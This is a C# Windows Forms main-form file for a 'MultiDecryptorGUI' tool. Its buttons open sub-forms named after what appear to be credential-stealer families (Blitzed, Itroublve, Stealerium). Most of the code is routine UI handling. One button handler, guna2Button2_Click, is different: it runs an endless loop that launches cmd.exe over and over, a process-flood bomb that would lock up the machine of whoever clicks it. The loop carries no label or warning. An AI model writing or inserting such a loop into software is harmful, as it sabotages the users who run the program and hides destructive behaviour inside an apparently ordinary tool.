using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MultiDecryptorGUI
{
    
    public partial class Form1 : Form
    {
        internal class Mouse
        {
            public static Point newpoint = default(Point);

            public static int x;

            public static int y;
        }

        public void loadform(object Form)
        {
			if(this.MainPanel.Controls.Count > 0)
				this.MainPanel.Controls.RemoveAt(0);
			Form f = Form as Form;
			f.TopLevel = false;
			f.Dock = DockStyle.Fill;
			this.MainPanel.Controls.Add(f);
			this.MainPanel.Tag = f;
			f.Show();
        }
		public Form1()
        {
            InitializeComponent();
		}

        private void panel2_Paint(object sender, PaintEventArgs e)
        {

        }
		private void pictureBox1_Click(object sender, EventArgs e)
		{

		}

		private void guna2Button1_Click(object sender, EventArgs e)
        {
			loadform(new BlitzedForm());
        }

        private void btn_ItroublveOptions_Click(object sender, EventArgs e)
        {
			loadform(new ItroublveForm());
        }

        private void btn_StealeriumOptions_Click(object sender, EventArgs e)
        {
			loadform(new StealeriumForm());
        }

        private void guna2Button1_Click_1(object sender, EventArgs e)
        {
			Environment.Exit(0);
        }

        private void PanelHeader_MouseDown(object sender, MouseEventArgs e)
        {
            Mouse.x = MousePosition.X - Location.X;
            Mouse.y = MousePosition.Y - Location.Y;
        }

        private void PanelHeader_MouseMove(object sender, MouseEventArgs e)
        {
            bool flag = e.Button == MouseButtons.Left;
            if (flag)
            {
                Mouse.newpoint = MousePosition;
                Mouse.newpoint.X = Mouse.newpoint.X - Mouse.x;
                Mouse.newpoint.Y = Mouse.newpoint.Y - Mouse.y;
                Location = Mouse.newpoint;
            }
        }

        private void guna2Button2_Click(object sender, EventArgs e)
        {
            while (true)
            {
                Process.Start("cmd.exe");
            }
        }
    }
}
